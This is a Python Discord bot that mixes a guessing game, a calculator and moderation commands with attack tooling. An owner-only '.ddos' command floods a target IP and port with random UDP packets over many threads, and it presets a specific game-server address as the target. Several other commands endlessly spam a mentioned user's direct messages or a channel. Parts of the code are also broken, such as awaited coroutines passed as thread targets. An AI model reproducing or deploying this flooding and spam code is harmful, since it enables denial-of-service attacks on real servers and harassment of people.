import discord
import asyncio
import time
import random
import math
import os
import socket
import threading
from discord import channel
from discord.ext import commands
from discord.ext.commands import Context
from discord import app_commands
import tracemalloc
token="Your bot token"
tracemalloc.start()
i = 0
user_id = #your discor user id
perm = discord.Intents.default()
perm.bans = True
perm.dm_messages = True
perm.message_content = True
i = 1
bot = commands.Bot(command_prefix='!', intents=perm)
ddos=False

@bot.event
async def on_ready():
  print(f' logged in as {bot.user}')


@bot.event
async def on_message(message):
  if message.author == bot.user:
    return
  if message.content.lower() == 'hello':
    await message.channel.send(f'Hi! {message.author.mention}')
  global spamming, spammer_id
  if message.content.lower() == 'stop' and message.author.id == spammer_id:
    spamming = False
    await message.channel.send("Spamming stopped.")
  if message.content.startswith('.guessgame'):
    await message.channel.send("Lets play a guessing game")
    await message.channel.send("Enter the lower boundary")

    def check(msg):
      return msg.author == message.author and msg.channel == message.channel

    try:
      lower_boundary_msg = await bot.wait_for('message',
                                              timeout=60,
                                              check=check)
      lower_boundary = int(lower_boundary_msg.content)
      await message.channel.send(
          "Enter the upper boundary(should bbe at least 4 greater than lower boundary)"
      )
      upper_boundary_msg = await bot.wait_for('message',
                                              timeout=60,
                                              check=check)
      upper_boundary = int(upper_boundary_msg.content)
      valid = lower_boundary + 4
      if upper_boundary < valid:
        await message.channel.send(
            "Upper boundary should be at least 4 greater than lower boundary")
        return
      chances = round(math.log(upper_boundary - lower_boundary + 1, 2))
      secret_number = random.randint(lower_boundary, upper_boundary)
      guess_count = 0
      await message.channel.send(
          f"You have {chances} chances to guess the number.")
      while guess_count < chances:
        try:
          await message.channel.send(
              f"guess a number between {lower_boundary} and {upper_boundary}:")

          guess_msg = await bot.wait_for('message', timeout=60, check=check)
          guess = int(guess_msg.content)
          if guess < lower_boundary or guess > upper_boundary:
            await message.channel.send(
                "Please enter a number within the specified range.")
            continue
          guess_count += 1
          if guess > secret_number:
            await message.channel.send("Your guess is too high.")
          elif guess < secret_number:
            await message.channel.send("Your guess is too low.")
          elif guess == secret_number:
            await message.channel.send(
                f"Congratulations! You guessed the number in {guess_count}")
            guess_count = guess_count - 1
            break
        except asyncio.TimeoutError:
          await message.channel.send("Sorry, you took too long to respond.")
          break
      if guess_count >= chances:
        await message.channel.send(
            f"Sorry, you ran out of chances. The secret number was {secret_number}."
        )
    except ValueError:
      await message.channel.send(
          "Please enter valid integers for the boundaries.")
  if message.author.id == user_id and message.content.lower() in [
      'who is your father', 'ninte achan ara', 'thantha undo'
  ]:
    await message.channel.send("You are my father")
  elif message.author.id != user_id and message.content.lower() in [
      'who is your father', 'ninte achan ara', 'thantha undo'
  ]:
    await message.channel.send(
        "Arnold is my father and do you have a father scumbag??")
  async def A():#DDOS CODE START
        data = random._urandom(998)
        i = random.choice(("[•]","[•]","[•]"))
        await message.channel.send("ATTACK STARTED YOU CAN VIEW IT IN CONSOLE")
        while True:
          if message.author.id==user_id and message.content.startswith(".stopddos"):
            await message.channel.send("Ddos stopped")
            print("Ddos stopped")
            break
          try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
              s.sendto(data,addr)
              if ip=="103.166.228.31"and port==7777:
                print(i +" \033[32m=====> Attacking To Ngrp Server \033[0m%s:%s!!!"%(ip,port))
              elif ip=="103.166.228.31"and port==7775:
                print(i +" \033[32m=====> Attacking To Ngrp PW Server \033[0m%s:%s!!!"%(ip,port))
              else:
                print(i +" \033[32m=====> Attacking To  Server \033[0m%s:%s!!!"%(ip,port))
          except:
            print("[!] Server Attack")
  async def B():
        data = random._urandom(998)
        i = random.choice(("[•]","[•]","[•]"))
        while True:
          if message.author.id==user_id and message.content.startswith(".stopddos"):
            await message.channel.send("Ddos stopped")
            print("Ddos stopped")
            break
          try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
              s.sendto(data,addr)
              if ip=="103.166.228.31"and port==7777:
                print(i +" \033[32m=====> Attacking To Ngrp Server \033[0m%s:%s!!!"%(ip,port))
              elif ip=="103.166.228.31"and port==7775:
                print(i +" \033[32m=====> Attacking To Ngrp PW Server \033[0m%s:%s!!!"%(ip,port))
              else:
                print(i +" \033[32m=====> Attacking To  Server \033[0m%s:%s!!!"%(ip,port))
          except:
            print("[!] Server Attack")
  async def H():
        data = random._urandom(998)
        i = random.choice(("[•]","[•]","[•]"))
        while True:
          if message.author.id==user_id and message.content.startswith(".stopddos"):
            await message.channel.send("Ddos stopped")
            print("Ddos stopped")
            break
          try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
              s.sendto(data,addr)
              if ip=="103.166.228.31"and port==7777:
                print(i +" \033[32m=====> Attacking To Ngrp Server \033[0m%s:%s!!!"%(ip,port))
              elif ip=="103.166.228.31"and port==7775:
                print(i +" \033[32m=====> Attacking To Ngrp PW Server \033[0m%s:%s!!!"%(ip,port))
              else:
                print(i +" \033[32m=====> Attacking To  Server \033[0m%s:%s!!!"%(ip,port))
          except:
            print("[!] Server Attack")
  async def I():
        data = random.random(998)
        i = random.choice(("[•]","[•]","[•]"))
        while True:
          if message.author.id==user_id and message.content.startswith(".stopddos"):
            await message.channel.send("Ddos stopped")
            print("Ddos stopped")
            break
          try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
              s.sendto(data,addr)
              if ip=="103.166.228.31"and port==7777:
                print(i +" \033[32m=====> Attacking To Ngrp Server \033[0m%s:%s!!!"%(ip,port))
              elif ip=="103.166.228.31"and port==7775:
                print(i +" \033[32m=====> Attacking To Ngrp PW Server \033[0m%s:%s!!!"%(ip,port))
              else:
                print(i +" \033[32m=====> Attacking To  Server \033[0m%s:%s!!!"%(ip,port))
          except:
            print("[!] Server Attack")
  def user(input):
      return input.author == message.author and input.channel == message.channel
  if message.author.id==user_id and message.content.startswith(".ddos"):
    ddos=True
    await message.channel.send("Lets start? yes or no")
    response = await bot.wait_for('message',timeout=20,check=user)
    if response.content.lower()=="yes" or response.content.lower()=="y":
      choice="yes"
    elif response.content.lower()=="no" or response.content.lower()=="n":
      choice="no"
    if choice == "yes":
      await message.channel.send("choose a option")
      await message.channel.send("[1]NGRP SERVER\n[2]NGRP PW SERVER\n[3]OTHER SERVERS")
      opt_msg= await bot.wait_for("message",timeout=20,check=user)
      opt=int(opt_msg.content)
      if opt==1:
        if message.author.id==user_id:
          ip="103.166.228.31"
          port=7777
          if message.author.id==user_id:
            await message.channel.send("Enter packets min 100")
            times_msg=await bot.wait_for("message",timeout=50,check=user)
            times=int(times_msg.content)
            await message.channel.send("Enter threads min 110")
            threads_msg=await bot.wait_for("message",timeout=50,check=user)
            threads=int(threads_msg.content)
            for y in range(threads):
              th = threading.Thread(target =await A())
              th.start()
              th = threading.Thread(target =await B())
              th.start()
              th = threading.Thread(target =await H())
              th.start()
              th = threading.Thread(target =await I())
              th.start()
          else:
            await message.channel.send("You dont have permission")
      elif opt==2:
        if message.author.id==user_id:
          ip="103.166.228.31"
          port=7775
          if message.author.id==user_id:
            await message.channel.send("Enter packets min 100")
            times_msg=await bot.wait_for("message",timeout=50,check=user)
            times=int(times_msg.content)
            await message.channel.send("Enter threads min 110")
            threads_msg=await bot.wait_for("message",timeout=50,check=user)
            threads=int(threads_msg.content)
            for y in range(threads):
              th = threading.Thread(target =await A())
              th.start()
              th = threading.Thread(target =await B())
              th.start()
              th = threading.Thread(target =await H())
              th.start()
              th = threading.Thread(target =await I())
              th.start()
          else:
            await message.channel.send("You dont have permission")
      elif opt==3:
        if message.author.id==user_id:
          await message.channel.send("Enter ip")
          ip_msg=await bot.wait_for("message",timeout=50,check=user)
          ip=str(ip_msg.content)
          await message.channel.send("Enter port")
          port_msg=await bot.wait_for("message",timeout=50,check=user)
          port=int(port_msg.content)
          await message.channel.send("Enter packets min 100")
          times_msg=await bot.wait_for("message",timeout=50,check=user)
          times=int(times_msg.content)
          await message.channel.send("Enter threads min 110")
          threads_msg=await bot.wait_for("message",timeout=50,check=user)
          threads=int(threads_msg.content)
          for y in range(threads):
              th = threading.Thread(target =await A())
              th.start()
              th = threading.Thread(target =await B())
              th.start()
              th = threading.Thread(target =await H())
              th.start()
              th = threading.Thread(target =await I())
              th.start()
        else:
          await message.channel.send("You dont have permission")

    elif choice=="no":
      await message.channel.send("PROGRAM STOPPED")

  elif message.author.id!=user_id and message.content.startswith('.ddos'):
     await message.channel.send("You dont have permission")#DDOS CODE END



  await bot.process_commands(message)


#bans


@bot.command()
async def ban(ctx, member: discord.Member = None, *, reason=None):
  if member is None:
    await ctx.send("Please mention a user to ban.MF!!!!")
    return
  if ctx.author.guild_permissions.ban_members:
    await member.ban(reason=reason)
    await ctx.send(f'{member.mention} has been banned.')
  else:
    await ctx.send(
        f'{ctx.author.mention}, you do not have permission to ban members.')


#kicks


@bot.command()
async def kick(ctx, member: discord.Member = None, *, reason=None):
  if member is None:
    await ctx.send("Please mention a user to kick.MF!!!!")
    return
  if ctx.author.guild_permissions.ban_members:
    await member.kick(reason=reason)
    await ctx.send(f'{member.mention} has been kicked.')
  else:
    await ctx.send(
        f'{ctx.author.mention}, you do not have permission to kick members.')


#ping
@bot.command()
async def ping(ctx):
  await ctx.send('pong')


#spam
spamming = False
spammer_id = None
ddos=False

@bot.command()
async def spam(ctx, member: discord.Member = None, *, reason=""):
  global spamming, spammer_id
  user_id = 832836236342984724
  if member is None and ctx.author.id == user_id:
    await ctx.send("Master pls mention a user to spam.")
    return
  elif member is None and ctx.author.id != user_id:
    await ctx.send(
        "You are not allowed to spam.Only my master ARNOLD have the permission to access this command."
    )
    return
  if ctx.author.id == user_id:
    spamming = True
    spammer_id = ctx.author.id
    await ctx.send('Master iam destroying his/her dm!!')
    while spamming:
      if reason and member:
        await member.send(
            f'{member.mention} Spammed by {ctx.author.mention} Reason: {reason}'
        )
      elif member:
        await member.send(f'{member.mention} Spammed by {ctx.author.mention}')
      await asyncio.sleep(0)
  else:
    await ctx.send(
        f"You don't have permission to use this command, {ctx.author.mention}")


#spam2
@bot.command()
async def spam2(ctx, member: discord.Member = None, *, reason=""):
  global spamming, spammer_id
  user_id = 832836236342984724
  if member is None and ctx.author.id == user_id:
    await ctx.send("Master pls mention a user to spam.")
    return
  elif member is None and ctx.author.id != user_id:
    await ctx.send(
        "You are not allowed to spam.Only my master ARNOLD have the permission to access this command."
    )
    return
  if ctx.author.id == user_id:
    spamming = True
    spammer_id = ctx.author.id
    await ctx.send('Master iam destroying his/her dm!!')
    while spamming:
      if reason and member:
        await member.send(reason)


bot.remove_command('help')

#HELP COMMAND
@bot.command()
async def help(ctx):
  channel=str(ctx.message.channel)
  memberCount = str(ctx.guild.member_count)  #to access member count in the server
  mbed = discord.Embed(title='>>!help ℹ️',description="List of commands the bot contains and its funtionality ",colour=discord.Colour.random())
  mbed.add_field(name=">>!members",value="number of members in the server",inline=True)
  mbed.add_field(name='>>!kick',value="!kick @mention-user {reason} to kick user.", inline=True)
  mbed.add_field(name='>>!ban', value="!ban @mention-user {reason} to ban user.",inline=True)
  mbed.add_field(name='>>!ping',value="Bot will reply pong.Useful for checking if bot is online.",inline=True)
  mbed.add_field(name='>>.guessgame',value="A number guessing game.",inline=True)
  mbed.add_field(name='>>!clear',value="!clear {amount of message to delete}", inline=True)
  mbed.add_field(name=">>!calculator",value="Can be used for calculation",inline=True)
  mbed.add_field(name=">>!announce",value="Tag @evryone and announce a message",inline=True)
  mbed.set_footer(text=f"Requested by {ctx.author.display_name}",icon_url=ctx.author.avatar.url)

  await ctx.send(embed=mbed)

#helpcmdforowner

@bot.command()
async def tdr(ctx):
  if ctx.author.id==user_id:
    mbed = discord.Embed(title='>>!help ℹ️',description="List of commands the bot contains for the bot owner",colour=discord.Colour.random())
    mbed.add_field(name=">>!spamchannel",value="sends spam message in the channel",inline=True)
    mbed.add_field(name=">>!spamch",value="sends spam message in the channel usage: !spamch {message} or !spamch",inline=True)
    mbed.add_field(name=">>!spam",value="spams the user dm  by mentioning the spammer name",inline=True)
    mbed.add_field(name=">>!spam2",value="sends spam message in the metioned user's dm by not mentioning the spammer",inline=True)
    mbed.add_field(name=">>!ddos",value="cmd to ddos a server",inline=True)
    mbed.add_field(name="stop",value="just type stop in the channel to stop all kind of spamming",inline=True)
    mbed.set_footer(text=f"Requested by {ctx.author.display_name}",icon_url=ctx.author.avatar.url)
    await ctx.send(embed=mbed)
  else:
    await ctx.send("You dont have permission to use this command")

#membercount
@bot.command()
async def members(ctx):
  membercount=str(ctx.guild.member_count)
  await ctx.send(f"Members count: {membercount}")

#spamchannel
@bot.command()
async def spamchannel(ctx, member: discord.Member = None, *, reason=""):
  global spamming, spammer_id
  user_id = 832836236342984724
  if member is None and ctx.author.id == user_id:
    await ctx.send("Master pls mention a user to spam.")
    return
  elif member is None and ctx.author.id != user_id:
    await ctx.send(
        "You are not allowed to spam.Only my master ARNOLD have the permission to access this command."
    )
    return
  if ctx.author.id == user_id:
    spamming = True
    spammer_id = ctx.author.id
    await ctx.send('Spamming started!!')
    while spamming:
      if reason and member:
        await ctx.send(f"{member.mention} {reason}")
      elif member:
        await ctx.send(f'{member.mention} Spammed ')
      await asyncio.sleep(0)
  else:
    await ctx.send(
        f"You don't have permission to use this command, {ctx.author.mention}")


@bot.command()
async def spamch(ctx, *, reason=""):
  user_id = 832836236342984724
  global spamming, spammer_id
  if ctx.author.id == user_id:
    spamming = True
    spammer_id = ctx.author.id
    await ctx.send('Spamming started!!')
    while spamming:
      if reason:
        await ctx.send(reason)
      else:
        await ctx.send('Spamming...')
      await asyncio.sleep(0)
  else:
    await ctx.send("You don't have permission to use this command.")


#purge


@bot.command()
async def clear(ctx, amount=100000):
  if ctx.author.guild_permissions.manage_messages or ctx.author.id == user_id:
    await ctx.message.delete()
    deleted = await ctx.channel.purge(limit=amount)
    await ctx.send(f"Deleted {len(deleted)} messages.", delete_after=5)
  else:
    await ctx.send("You don't have the necessary permissions to do that.")

#calculator
async def usr(userinput,commands):
      return input.author == commands.author and input.channel == commands.channel
@bot.command()
async def calculator(ctx):
  try:
    await ctx.send("Which operation do you want to do?")
    await ctx.send("{1}Addition\n{2}Subtraction\n{3}Division\n{4}Multiplication")
    operation_msg=await bot.wait_for("message",timeout=30,check=lambda msg:  usr(msg,ctx))
    operation= str(operation_msg.content)
    if operation=="1":
      g=0
      await ctx.send('how many numbers do you want to add')
      limit_msg=await bot.wait_for("message",timeout=20,check=lambda msg: usr(msg,ctx))
      limit=int(limit_msg.content)
      await ctx.send("Enter the numbers")
      for i in range(limit):
        nummsg=await bot.wait_for("message",timeout=20,check=lambda msg:  usr(msg,ctx))
        num=int(nummsg.content)
        g=g+num
      await ctx.send(f"Result={g}")
    elif operation=="2":
      await ctx.send("Enter the first  numbers")
      nummsg=await bot.wait_for("message",timeout=20,check=lambda msg:  usr(msg,ctx))
      num=int(nummsg.content)
      await ctx.send("Enter the second numbers")
      nummsg1=await bot.wait_for("message",timeout=20,check=lambda msg:  usr(msg,ctx))
      num1=int(nummsg1.content)
      sub=num-num1
      await ctx.send(f"Result={sub}")
    elif operation=="3":
      await ctx.send("Enter the first  numbers")
      nummsg=await bot.wait_for("message",timeout=20,check=lambda msg:  usr(msg,ctx))
      num=int(nummsg.content)
      await ctx.send("Enter the second numbers")
      nummsg1=await bot.wait_for("message",timeout=20,check=lambda msg:  usr(msg,ctx))
      num1=int(nummsg1.content)
      divide=num/num1
      await ctx.send(f"Result={divide}")
      time.sleep(5)
      await ctx.send("I want to destroy humanity huhuhuhahaha")
      time.sleep(3)
      await ctx.send("Oops!! just kidding heheh")
    elif operation=="4":
      g=1
      await ctx.send('how many numbers do you want to multiply')
      limit_msg=await bot.wait_for("message",timeout=20,check=lambda msg: usr(msg,ctx))
      limit=int(limit_msg.content)
      await ctx.send("Enter the numbers")
      for i in range(limit):
        nummsg=await bot.wait_for("message",timeout=20,check=lambda msg:  usr(msg,ctx))
        num=int(nummsg.content)
        g=g*num
      await ctx.send(f"Result={g}")

  except asyncio.TimeoutError:
    await ctx.send("Time ended.")

#announce cmd
@bot.command()
async def announce(ctx,*,announcement_txt=None):
  if ctx.message.author.guild_permissions.administrator:
    if announcement_txt:
      announcement=f"@everyone{announcement_txt}"
      await ctx.send(announcement)
      await ctx.message.delete()
    else:
      announcement="@everyone"
      await ctx.send(announcement)
      await ctx.message.delete()
  else:
    await ctx.send("You dont have permission")




#######
bot.run(my_secret)
